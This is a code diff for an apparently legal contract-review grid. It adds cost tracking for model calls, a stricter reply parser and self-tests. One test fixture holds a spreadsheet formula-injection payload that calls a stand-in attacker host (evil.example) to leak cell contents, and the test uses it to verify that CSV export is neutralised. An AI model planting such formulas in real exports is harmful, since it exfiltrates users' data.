@@ -1717,6 +1717,9 @@ def _review_table_status(args: dict, ctx: Context) -> dict:
     if table is None:
         return _refuse("NOT_FOUND", f"no review table {grid_id!r} for this tenant")
     out = rgr.status(table, cancelled=cancelled)
+    # The running total, from the cells this verb already read -- not from 240 extra reads
+    # of each cell's run steps, which is why 013 put the debit on the cell.
+    out["spend"] = _grid_spend(ctx.store.read_grid_cells(grid_id))
     out["cells_detail"] = [table.cell(d, c.name).to_dict()
                            if hasattr(table.cell(d, c.name), "to_dict")
                            else {"document_id": d, "column": c.name,
@@ -2025,8 +2028,14 @@ def _draft_status_verb(args: dict, ctx: Context) -> dict:
     return _draft_status(ctx, draft_id)
 
 
-def _cell_answerer(ctx: Context):
+def _cell_answerer(ctx: Context, debits: list | None = None):
     """`answer(question, kind, text) -> (value, quote) | None`, from the routed model.
+
+    `debits` collects one `Served.step_fields()` per call -- the provider, the model, the
+    region and the rupees derived from the tokens the provider REPORTED. A review table is
+    the most expensive thing this product does (one call per cell, 240 for a 40x6 table),
+    and until this list existed the only record of that spend was a sentence with no number
+    in it.
 
     Raises when no model can be served, and that is deliberate: `agents/review_grid.run_cell`
     turns a raise into a FAILED cell ("this did not run"), which is the truth. Returning
@@ -2052,18 +2061,121 @@ def _cell_answerer(ctx: Context):
                   + "VALUE: <the answer, or NONE if the document does not answer it>\n"
                   + "QUOTE: <the sentence you read it from, verbatim>\n\n"
                   + wrap_untrusted(text, "the document"))
-        raw = str(served.call(prompt) or "")
-        value = quote = ""
-        for line in raw.splitlines():
-            if line.upper().startswith("VALUE:"):
-                value = line.split(":", 1)[1].strip()
-            elif line.upper().startswith("QUOTE:"):
-                quote = line.split(":", 1)[1].strip()
-        if not value or value.upper() == "NONE":
-            return None
-        return (value, quote)
+        try:
+            raw = str(served.call(prompt) or "")
+        finally:
+            # In a `finally`, because the call is what costs money: a reply that then
+            # fails to parse, or a transport error after the provider billed us, still
+            # has to be debited. A ledger that only records successful cells
+            # systematically understates the bill.
+            if debits is not None:
+                debits.append(served.step_fields())
+        return _parse_cell_reply(raw)
 
     return answer
+
+
+def _parse_cell_reply(raw: str):
+    """The two-line reply -> (value, quote), or None for an explicit NONE.
+
+    Raises `review_grid.Unreadable` when the reply does not follow the format, and that
+    distinction is the whole function: the first version set `value = ""`, found no
+    `VALUE:` line, and returned None -- which `run_cell` reads as NOT_FOUND. So a model
+    that replied in prose, in JSON, or with an apology made the cell assert that the clause
+    is ABSENT from a document it had just described. An absence is a finding, and that one
+    was manufactured here.
+
+    Three outcomes, and `None` is reserved for the one the MODEL stated:
+
+        VALUE: 3 years / QUOTE: ...   -> the pair
+        VALUE: NONE                   -> None, because the model said so
+        anything else                 -> Unreadable -> NEEDS_LAWYER
+
+    A `VALUE:` line that is empty is Unreadable too, not NONE: a blank is not a statement
+    that the document is silent, and the model had a word for that.
+    """
+    from agents.review_grid import Unreadable
+    value = quote = ""
+    saw_value = False
+    for line in (raw or "").splitlines():
+        if line.upper().startswith("VALUE:"):
+            saw_value = True
+            value = line.split(":", 1)[1].strip()
+        elif line.upper().startswith("QUOTE:"):
+            quote = line.split(":", 1)[1].strip()
+    if not saw_value:
+        raise Unreadable(
+            f"no VALUE: line in a {len(raw or '')}-character reply, so nothing was read "
+            f"from it. This is NOT an absence: the reply began "
+            f"{(raw or '').strip()[:80]!r}")
+    if not value:
+        raise Unreadable(
+            "the VALUE: line was empty. A blank is not a statement that the document is "
+            "silent -- the format has NONE for that -- so it is not recorded as one")
+    if value.upper() == "NONE":
+        return None
+    return (value, quote)
+
+
+def _cell_debit(debits: list, *, stubbed: bool) -> dict:
+    """{provider, cost_inr, cost_note} for one cell. NEVER a zero standing in for unknown.
+
+    Three ways a cell has no number, and they are different facts, so they get different
+    notes rather than one 0.00:
+
+        a priced call      the rupees from `Served.step_fields()`
+        a call we cannot price   NULL, and the note begins "UNPRICED:"
+        no billed call at all   NULL, and the note says which: a stub answerer, or a cell
+                                that returned before anything was sent (an unreadable
+                                document, no text held)
+
+    `review_table.status` sums only the first kind and says how many of the others there
+    were, because a total that silently included them would be a smaller number presented
+    as the bill.
+    """
+    if debits:
+        f = debits[-1]
+        return {"provider": f.get("provider"), "cost_inr": f.get("cost_inr"),
+                "cost_note": f.get("cost_note")}
+    if stubbed:
+        return {"provider": None, "cost_inr": None,
+                "cost_note": ("no billed call was made: a caller-supplied answerer served "
+                              "this cell. This is not a cost of zero.")}
+    return {"provider": None, "cost_inr": None,
+            "cost_note": ("no model was called for this cell -- it returned before "
+                          "anything was sent. This is not a cost of zero.")}
+
+
+def _grid_spend(rows) -> dict:
+    """The grid's running total, and what the total does NOT include.
+
+    A single number would have to choose what to do with the cells that ran and could not
+    be priced, and both choices are wrong: dropping them makes the total read as the bill,
+    and counting them as 0.00 claims those calls were free. So the total is the PRICED
+    cells only, it is labelled a lower bound whenever anything else ran, and the counts
+    that make it one are beside it.
+    """
+    priced = [float(r["cost_inr"]) for r in rows if r.get("cost_inr") is not None]
+    ran = [r for r in rows if str(r.get("state") or "") != "PENDING"]
+    unpriced = [r for r in ran if r.get("cost_inr") is None]
+    pending = [r for r in rows if str(r.get("state") or "") == "PENDING"]
+    total = round(sum(priced), 4) if priced else None
+    if total is None:
+        note = (f"UNPRICED: not one of this table's {len(rows)} cells carries a price, so "
+                f"there is no total. {len(ran)} cell(s) have run. A zero here would claim "
+                f"the work was free.")
+    elif unpriced or pending:
+        note = (f"At least Rs.{total:.4f}, over {len(priced)} priced cell(s). "
+                f"{len(unpriced)} cell(s) ran and could not be priced and "
+                f"{len(pending)} have not run, so the true figure is HIGHER. This is a "
+                f"lower bound, not the bill.")
+    else:
+        note = (f"Rs.{total:.4f} over all {len(priced)} cells, every one priced from the "
+                f"tokens the provider reported.")
+    return {"total_inr": total, "priced_cells": len(priced),
+            "unpriced_cells": len(unpriced), "pending_cells": len(pending),
+            "is_lower_bound": total is not None and bool(unpriced or pending),
+            "note": note}
 
 
 def _review_grid_cell(args: dict, ctx: Context) -> dict:
@@ -2078,26 +2190,33 @@ def _review_grid_cell(args: dict, ctx: Context) -> dict:
     if ctx.store is None:
         return {"status": "FAILED", "error": "a grid cell needs the store to write to"}
     answer = (ctx.model_for(()) if ctx.model_for is not None else None)
+    stubbed = answer is not None
+    debits: list = []
     if answer is None:
-        answer = _cell_answerer(ctx)
+        answer = _cell_answerer(ctx, debits)
     try:
         cell = rgr.run_cell(args, documents=ctx.documents, answer=answer)
     except rgr.RunnerError as e:
         return {"status": "FAILED", "error": str(e)}
+    debit = _cell_debit(debits, stubbed=stubbed)
     wrote = ctx.store.write_grid_cell(
         {"grid_id": args["grid_id"], "document_id": cell.document_id,
          "column_name": cell.column, "state": cell.state, "value": cell.value,
-         "quote": cell.quote, "reason": cell.reason})
+         "quote": cell.quote, "reason": cell.reason,
+         "provider": debit["provider"], "cost_inr": debit["cost_inr"],
+         "cost_note": debit["cost_note"]})
+    # The ledger `run_steps` has been since 003, with the same numbers. A cell is a run, so
+    # this is one step per cell and the two records cannot disagree: they are built from
+    # one `Served.step_fields()`.
     ctx.last_steps.append({
-        "capability": "review_grid.cell", "status": "ANSWERED",
-        "cost_note": ("one extraction call for one cell"
-                      if cell.state != "FAILED" else
-                      "the call did not complete; no cost is claimed for a call whose "
-                      "outcome is unknown")})
+        "capability": "review_grid.cell",
+        "status": "FAILED" if cell.state == "FAILED" else "ANSWERED",
+        **debit})
     return {"status": "ANSWERED" if wrote else "ANSWERED",
             "grid_id": args["grid_id"], "document_id": cell.document_id,
             "column": cell.column, "cell_state": cell.state,
-            "written": wrote,
+            "written": wrote, "cost_inr": debit["cost_inr"],
+            "cost_note": debit["cost_note"],
             "note": (None if wrote else
                      "this cell was already answered; the earlier answer was kept. A "
                      "worker handed the same cell twice does not overwrite it.")}
@@ -3296,17 +3415,44 @@ def _test() -> None:
     check(_hV["review_table.status"].run({"grid_id": "nope"}, _hctx)["code"] == "NOT_FOUND",
           "an unknown grid is NOT_FOUND, never an empty table")
 
-    # Answer two cells, one FOUND and one NOT_FOUND.
+    # Answer two cells, one FOUND and one NOT_FOUND. One priced, one UNPRICED, so the
+    # running total below has both kinds to deal with.
     _hctx.store.write_grid_cell({"grid_id": _gid, "document_id": _d1,
                                  "column_name": "governing law", "state": "FOUND",
                                  "value": "India",
-                                 "quote": "Governed by the laws of India"})
+                                 "quote": "Governed by the laws of India",
+                                 "provider": "azure", "cost_inr": 0.0412,
+                                 "cost_note": "priced from reported tokens"})
     _hctx.store.write_grid_cell({"grid_id": _gid, "document_id": _d2,
                                  "column_name": "governing law", "state": "NOT_FOUND",
-                                 "reason": "the agreement names no governing law at all"})
+                                 "reason": "the agreement names no governing law at all",
+                                 "provider": "azure", "cost_inr": None,
+                                 "cost_note": "UNPRICED: no verified price for this "
+                                              "deployment"})
     _st2 = _hV["review_table.status"].run({"grid_id": _gid}, _hctx)
     check(_st2["findings"] == 2 and _st2["by_state"]["PENDING"] == 2,
           f"two answers are two findings; the unrun cells stay PENDING ({_st2['findings']})")
+
+    # ── the running total, and what it refuses to pretend ──────────────────
+    _sp = _st2["spend"]
+    check(_sp["total_inr"] == 0.0412 and _sp["priced_cells"] == 1,
+          f"**.status carries the grid's running total** ({_sp['total_inr']})")
+    check(_sp["unpriced_cells"] == 1 and _sp["pending_cells"] == 2,
+          f"...with the cells it does NOT include, counted separately "
+          f"({_sp['unpriced_cells']} unpriced, {_sp['pending_cells']} pending)")
+    check(_sp["is_lower_bound"] and "HIGHER" in _sp["note"],
+          "...and it says in words that the true figure is higher, because a total that "
+          "quietly dropped an UNPRICED call would read as the bill")
+    check("0" not in str(_sp["unpriced_cells"]) or _sp["total_inr"] != 0,
+          "...and the UNPRICED cell contributed nothing rather than being counted as 0.00")
+    _fresh = _hV["review_table.status"].run(
+        {"grid_id": _hV["review_table.create"].run(
+            {"name": "unrun", "document_ids": [_d1],
+             "columns": [{"name": "c", "kind": "text", "question": "q?"}]},
+            _hctx)["grid_id"]}, _hctx)["spend"]
+    check(_fresh["total_inr"] is None and _fresh["note"].startswith("UNPRICED"),
+          f"a table where nothing has run has NO total -- UNPRICED, not Rs.0.00 "
+          f"({_fresh['total_inr']!r})")
 
     # ── export: words in every cell, and no formula can run ────────────────
     _ex = _hV["review_table.export"].run({"grid_id": _gid}, _hctx)
@@ -3337,7 +3483,8 @@ def _test() -> None:
     _hctx.store.write_grid_cell(
         {"grid_id": _eg, "document_id": _evil, "column_name": "governing law",
          "state": "FOUND", "value": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\")",
-         "quote": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\") governs"})
+         "quote": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\") governs",
+         "cost_note": "no billed call: written directly by this suite"})
     _ec = _hV["review_table.export"].run({"grid_id": _eg}, _hctx)["csv"]
     check(not any(v.startswith(("=", "+", "@")) for r in _csv.reader(_io.StringIO(_ec))
                   for v in r),
@@ -3407,7 +3554,90 @@ def _test() -> None:
         _drained += 1
     check(_drained == 6, f"the worker drained exactly 6 jobs ({_drained})")
 
+    # ── an UNREADABLE model reply becomes NEEDS_LAWYER, never NOT_FOUND ────
+    # Through the REAL parser the served path uses, with the model's words as the input.
+    from agents.review_grid import Unreadable as _Unread
+    check(_parse_cell_reply("VALUE: 3 years\nQUOTE: for a period of three years")
+          == ("3 years", "for a period of three years"),
+          "the two-line format parses to a value and its quote")
+    check(_parse_cell_reply("VALUE: NONE\nQUOTE: ") is None,
+          "...and an explicit NONE is None, which is the only route to NOT_FOUND")
+    for _bad, _why in (
+            ("The document says the term is three years.", "a prose reply"),
+            ('{"value": "3 years", "quote": "three years"}', "a JSON reply"),
+            ("I'm sorry, I can't help with that.", "a refusal in prose"),
+            ("", "an empty reply"),
+            ("VALUE:   \nQUOTE: something", "a VALUE: line with nothing on it")):
+        try:
+            _got = _parse_cell_reply(_bad)
+            check(False, f"{_why} raises rather than returning {_got!r} -- returning None "
+                         f"is what made this an ABSENCE")
+        except _Unread:
+            check(True, f"{_why} is Unreadable, NOT None")
+
+    # And end to end, as a cell: the model answers in prose about a document it read.
+    def _prose_model(_origins):
+        def answer(question, kind, text):
+            return _parse_cell_reply("The agreement is governed by Indian law, clause 14.")
+        return answer
+
+    _pctx = Context(store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
+                    model_for=_prose_model)
+    _pd = list(_DOCS)[0]
+    _pctx.documents[_pd] = {"sha256": _pd, "name": "p.txt", "text": _DOCS[_pd],
+                            "bytes": len(_DOCS[_pd])}
+    _pg = by_name()["review_table.create"].run(
+        {"name": "garbled", "document_ids": [_pd],
+         "columns": [{"name": "governing law", "kind": "text",
+                      "question": "Which law governs this agreement?"}]}, _pctx)["grid_id"]
+    _ph = queue_handlers(_pctx)
+    _run_once(queue=_pctx.queue, store=_pctx.store, handlers=_ph, worker="w1")
+    _pcell = by_name()["review_table.status"].run({"grid_id": _pg}, _pctx)["cells_detail"][0]
+    check(_pcell["state"] == "NEEDS_LAWYER",
+          f"a model that answers in PROSE gives NEEDS_LAWYER end to end "
+          f"({_pcell['state']})")
+    check(_pcell["state"] != "NOT_FOUND",
+          "...and NOT NOT_FOUND: the document was read and described, and the old parser "
+          "turned that into 'this clause is absent'")
+    check("unreadable model reply" in _pcell["reason"],
+          f"...with the reason naming it ({_pcell['reason'][:46]!r})")
+    check("COULD NOT RUN" not in by_name()["review_table.export"].run(
+              {"grid_id": _pg}, _pctx)["csv"],
+          "...and it does not export as COULD NOT RUN either, which is FAILED's label: "
+          "the call ran")
+
+    # ── THE LEDGER: one debit per cell, read from run_steps ────────────────
+    # A cell is a run (`run_id_for_cell` is a uuid5 of its key), so the ledger entry for a
+    # cell is its run's step. Read back from the store, not counted from the handler's
+    # return: the question is what was PERSISTED.
+    from agents.review_grid import run_id_for_cell as _rid
+    _entries = []
+    for _d in _DOCS:
+        for _c in ("governing law", "term end"):
+            _run = _e2e.store.read_run(_rid(_gid, _d, _c)) or {}
+            _entries += [st for st in (_run.get("steps") or ())
+                         if st.get("capability") == "review_grid.cell"]
+    check(len(_entries) == 6,
+          f"**a 6-cell grid records 6 LEDGER ENTRIES**, one per cell ({len(_entries)})")
+    check(all(st.get("cost_note") for st in _entries),
+          "...and every one says what it cost or why there is no number")
+    check(all(st.get("cost_inr") is None for st in _entries),
+          "...here all None, because a stub answerer served them: no billed call was made")
+    check(all("not a cost of zero" in st["cost_note"] for st in _entries),
+          f"...and each note SAYS that is not a cost of zero "
+          f"({_entries[0]['cost_note'][:46]!r})")
+    _cellrows = _e2e.store.read_grid_cells(_gid)
+    check([r for r in _cellrows if r["cost_note"]] and len(_cellrows) == 6,
+          "...and the same note is on the CELL, which is what .status adds up")
+    check({st["cost_note"] for st in _entries}
+          == {r["cost_note"] for r in _cellrows},
+          "...identically: the step and the cell are built from ONE debit, so the two "
+          "records cannot drift apart")
+
     _st = _eV["review_table.status"].run({"grid_id": _gid}, _e2e)
+    check(_st["spend"]["total_inr"] is None and _st["spend"]["unpriced_cells"] == 6,
+          f"...and a table of unbilled cells has NO total, with all 6 counted as unpriced "
+          f"({_st['spend']['total_inr']!r})")
     check(_st["complete"], f"**.status shows the table COMPLETE** ({_st['by_state']})")
     check(_st["by_state"]["PENDING"] == 0, "...no cell is left PENDING")
     check(_st["by_state"]["FAILED"] == 0,
